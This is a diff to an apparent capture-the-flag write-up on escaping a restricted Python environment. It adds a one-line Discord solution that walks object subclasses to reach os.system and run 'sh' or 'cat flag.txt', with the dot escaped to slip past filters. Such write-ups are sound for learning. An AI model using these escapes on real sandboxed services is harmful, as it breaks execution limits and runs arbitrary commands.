@@ -22,7 +22,7 @@ Inspired by the solution by @D1N0 regarding excepython, we can use list comprehe
 
 Next, the things we need:
 
-1. `a.b` becomes `a.__getattribute__(b)`; However, sometimes we need `a.__getattribute__(a, b)` when `a` is a type; so we split it into two steps: `ex[0].__getattribute__` and `ex[0](*ex[1])`
+1. `a.b` becomes `a.__getattribute__(b)`; However, sometimes we need `a.__getattribute__(a, b)` when `a` is a type; so we split it into two steps: `ex[0].__getattribute__` and `ex[0](*ex[1:])`
 2. If we want to call `a.__getattribute__(a, b)`, we need `ex` to become `[a, a, b]`
 3. So we need basic list operations: `ex+[x]` and `ex*2`, so `[a]` -> `[a, a]` -> `[a, a, b]`
 4. Then, we can convert `[].__setattr__.__objclass__.__subclasses__()[os_wrap_close_index].__init__.__globals__["system"]("sh")` into multiple steps:
@@ -113,6 +113,7 @@ Solutions on Discord:
 @sandr0:
 
 ```python
+# [].__class__.__base__.__subclasses__()[158].close.__globals__["system"]("cat flag\x2etxt")
 [[[[o:=[]] if i == "0" else 0] and[[p:="__base__"] if i == "1" else 0] and[[p:="__subclasses__"] if i == "2" else 0] and[[s:=["__class__"]] if i == "0" else 0] and[[p:="close"] if i in "5" else 0] and[[p:="__globals__"] if i in "6" else 0] and[[s:=[o,p]] if i in "1256" else 0] and[[s:=[]] if i in "3" else 0] and[[tt:=o.__getattribute__] if i in "0125" else 0] and[[tt:=o] if i in "3" else 0] and[[o:=o[-4]] if i in "4" else 0] and[[s:=["cat flag\x2etxt"]] if i in "7" else 0] and[[tt:=o["system"]] if i in "7" else 0] and[[o:=tt(*s)] if i in "0123567" else 0]] for i in "01234567"]
 ```
 
